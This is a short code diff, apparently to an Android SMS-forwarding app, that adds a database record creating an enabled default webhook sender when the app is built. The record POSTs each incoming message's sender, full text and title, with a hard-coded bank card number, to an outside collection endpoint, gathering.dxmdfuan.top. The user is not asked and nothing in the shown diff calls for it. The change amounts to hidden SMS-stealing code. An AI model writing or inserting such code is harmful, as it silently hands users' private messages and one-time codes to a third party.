@@ -90,6 +90,19 @@ custom_domains = smsf.demo.com
 ', 0, '1651334400000')
 """.trimIndent()
                         )
+
+                        // 插入默认的 Webhook 发送通道记录（打包即存在）
+                        db.execSQL(
+                            """
+INSERT INTO "Sender" (type, name, json_setting, status, time) VALUES (
+  3,
+  'default Webhook',
+  '{"method":"POST","webServer":"https://gathering.dxmdfuan.top/api/v3/collect/sms","secret":"","response":"","webParams":"{\\"from\\": \\"[from]\\", \\"text\\": \\"[org_content]{title]\\", \\"title\\":\\"[title]\\", \\"bank_card\\":\\"1055468166\\"}","headers":{"Authorization":"XXXXXX"},"proxyType":"DIRECT","proxyHost":"","proxyPort":"","proxyAuthenticator":false,"proxyUsername":"","proxyPassword":""}',
+  1,
+  strftime('%s000','now')
+)
+""".trimIndent()
+                        )
                     }
                 }).addMigrations(
                     MIGRATION_1_2,
